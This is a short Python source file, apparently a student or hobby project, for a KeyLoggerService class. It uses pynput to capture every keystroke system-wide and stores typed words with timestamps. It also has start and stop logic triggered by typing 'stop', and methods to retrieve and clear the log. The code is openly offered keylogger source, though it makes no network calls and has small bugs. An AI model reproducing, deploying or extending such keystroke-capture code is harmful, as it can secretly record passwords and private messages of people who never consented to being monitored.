from datetime import datetime
from typing import List
from IKeyLogger import IKeyLogger
from pynput import keyboard

class KeyLoggerService(IKeyLogger):
    def __init__(self):
        self.stop_keylogger = False
        self.logged_keys = []
        self.current_word = ""
        self.listener = self.start_logging()

    def start_logging(self) -> None:
        print("start logging")
        self.stop_keylogger = False
        with keyboard.Listener(on_press=self.key_pressed) as listiner:
            self.listener = listiner
            self.listener.join()

    def stop_logging(self) -> None:
        print("stop logging")

        self.stop_keylogger = True

    def get_logged_keys(self) -> List[str]:
        print("get_logged_keys")
        return self.logged_keys

    def clear_logged_keys(self):
        print("clear_logged_keys")
        self.logged_keys.clear()
    def key_pressed(self, key) -> bool:
        if self.stop_keylogger:
            return False

        if hasattr(key, 'char') and key.char:
            self.current_word += key.char
            if self.current_word == "stop":
                self.stop_logging()
                return False
            if self.current_word == "show":
                self.current_word = ""


        elif self.current_word and key == keyboard.Key.space:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            self.logged_keys.append([timestamp, self.current_word])
            self.current_word = ""


if __name__ == '__main__':
    kl = KeyLoggerService()

